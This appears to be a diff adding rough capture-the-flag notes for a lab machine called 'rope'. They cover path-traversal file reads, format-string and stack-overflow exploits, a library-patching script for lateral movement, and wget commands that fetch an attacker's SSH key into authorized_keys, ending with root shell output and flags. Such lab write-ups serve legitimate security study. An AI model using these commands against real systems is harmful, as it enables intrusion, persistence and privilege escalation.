@@ -1,0 +1,216 @@
+curl -XPOST -vvv --path-as-is http://10.10.10.148:9999/../../../../../../../../../../etc/passwd
+
+curl -XPOST -vvv --path-as-is http://10.10.10.148:9999/../../../../../../../../../../../home/john/
+
+
+curl -XPOST -vvv --path-as-is http://10.10.10.148:9999/../../../../../../../../../../../home/john/.python_history
+
+curl -vvv --path-as-is http://10.10.10.148:9999/../www/httpserver --output a
+32 bit ELF - Starts HTTP server on 9999
+
+
+Looks like buffer overflow in `httpserver`
+https://github.com/shenfeng/tiny-web-server/blob/master/tiny.c
+
+Original code is modified and the new `http_request` struct is
+
+```
+ → 0x565570ec <log_access+117> call   0x56556060 <printf@plt>
+
+ break *log_access+117
+```
+
+
+0xffffc6a4│+0x00d4: 0xbadc0ded
+
+
+Example:
+https://github.com/Gallopsled/pwntools-write-ups/blob/master/wargames/overthewire-vortex/level12/win.py
+
+
+New vulnerability:
+
+Format string vuln in `log_access`. Trigger using:
+
+```
+ruby -e 'print "AAAA %25x%25x%25x\n\n"'| nc localhost 9999
+
+Payload need to be URL encoded as vuln is triggered after URL decode
+```
+
+
+Exploit strategy:
+
+1. Write what where
+2. Find libc base (?)
+3. Build ROP (using httpserver or libc)
+4. Overwrite RET (or GOT/PLT)
+5. Start ROP
+6. Exec payload
+
+0xffffb5fc
+
+
+0xffffcf7c│+0x09ac: 0xffffcfec  →  0xf7e0d75b  →   add esp, 0x10
+
+
+
+
+
+```
+
+__isoc99_sscanf@plt (
+   [sp + 0x0] = 0xffffb9ec → "GET /abc HTTP/1.1",
+   [sp + 0x4] = 0x5655827c → "%s %s"
+)
+
+
+
+```
+
+
+https://github.com/shenfeng/tiny-web-server/blob/master/tiny.c
+
+
+Looks like the http_request struct is modified
+
+```
+typedef struct {
+    char filename[1024];
+    char method[1024];
+    off_t offset;              /* for support Range */
+    size_t end;
+} http_request;
+```
+
+
+```
+johnnyz187
+August 9
+Whats with all the reverse engineering exploits?
+
+User: Dont fall for the lfi exploit, just use it to grab some binaries. I repeat do not go down that rabbit hole. Spent two days on it.
+
+Root: Same process as grabbing shell
+```
+
+
+```
+./pwn1.py
+
+wget -O /tmp/x 10.10.14.148/id_rsa
+mkdir /home/john/.ssh
+mv /tmp/x /home/john/.ssh/authorized_keys
+chmod 400 /home/john/.ssh/authorized_keys
+
+mkdir /home/john/.ssh
+wget -O /home/john/.ssh/authorized_keys 10.10.14.121:8000/ssh/id_rsa.pub
+chmod 400 /home/john/.ssh/authorized_keys
+
+
+mkdir /home/r4j/.ssh
+wget -O /home/r4j/.ssh/authorized_keys 10.10.14.121:8000/ssh/id_rsa.pub
+chmod 400 /home/r4j/.ssh/authorized_keys
+```
+
+
+Someone else's exploit for the john to r4j lateral movement.
+
+```
+import os
+signature = b'/usr/bin/tail -n10 /var/log/auth.log'
+fd = open('/lib/x86_64-linux-gnu/liblog.so', 'r+b')
+content = fd.read()
+idx = content.find(signature)
+fd.seek(idx)
+fd.write(b'/tmp/...;')
+fd.close()
+os.system('sudo -u r4j /usr/bin/readlogs')
+fd = open('/lib/x86_64-linux-gnu/liblog.so', 'r+b')
+fd.seek(idx)
+fd.write(signature)
+fd.close()
+print('Done')
+quit()
+
+```
+
+```
+r4j@rope:/tmp$ cd /home/r4j
+r4j@rope:/home/r4j$ ls
+user.txt
+r4j@rope:/home/r4j$ cat user.txt 
+deb9b4de27071d829962124c1cd0ae1d
+r4j@rope:/home/r4j$ 
+
+```
+
+# Escalation
+
+```
+root      1182  0.0  0.0   4628   780 ?        Ss   05:11   0:00 /bin/sh -c /opt/support/contact
+root      1183  0.0  0.0   4628   812 ?        Ss   05:11   0:00 /bin/sh -c sudo -u john /opt/www/run.sh
+root      1185  0.0  0.2  66552  4264 ?        S    05:11   0:00 sudo -u john /opt/www/run.sh
+root      1186  0.0  0.0   4516   852 ?        S    05:11   0:00 /opt/support/contact
+
+tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      -                   
+
+
+```
+
+
+Contact vuln
+
+```
+
+void handle_input_message(int param_1)
+
+{
+  long in_FS_OFFSET;
+  undefined stack_buf [56];
+  long local_10;
+  
+  local_10 = *(long *)(in_FS_OFFSET + 0x28);
+                    /* overflow - 0x400 in 56 bytes space. */
+  recv(param_1,stack_buf,0x400,0);
+  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
+                    /* WARNING: Subroutine does not return */
+    __stack_chk_fail();
+  }
+  return;
+}
+```
+
+Trigger
+
+```
+ruby -e "print 'A'*1024" | nc localhost 1337
+```
+
+Crash
+
+```
+[#0] 0x7ffff7e2e081 → __GI_raise(sig=0x6)
+[#1] 0x7ffff7e19535 → __GI_abort()
+[#2] 0x7ffff7e6fdb8 → __libc_message(action=<optimized out>, fmt=0x7ffff7f7a8a2 "*** %s ***: %s terminated\n")
+[#3] 0x7ffff7efe81d → __GI___fortify_fail_abort(need_backtrace=0x0, msg=0x7ffff7f7a880 "stack smashing detected")
+[#4] 0x7ffff7efe7d2 → __stack_chk_fail()
+[#5] 0x5555555555e1 → leave 
+```
+
+LIBC_BASE_BRUTE
+
+0x00007fe3431ed000
+0x00007fbbc57a3000
+0x00007fd802ce5000
+0x00007f02af515000
+
+```
+[+] Opening connection to 127.0.0.1 on port 1337: Done
+[*] Switching to interactive mode
+$ id
+uid=0(root) gid=0(root) groups=0(root)
+$ cat /root/root.txt
+1c773343b3c60c6778b9eefc4da84dff
+
+```
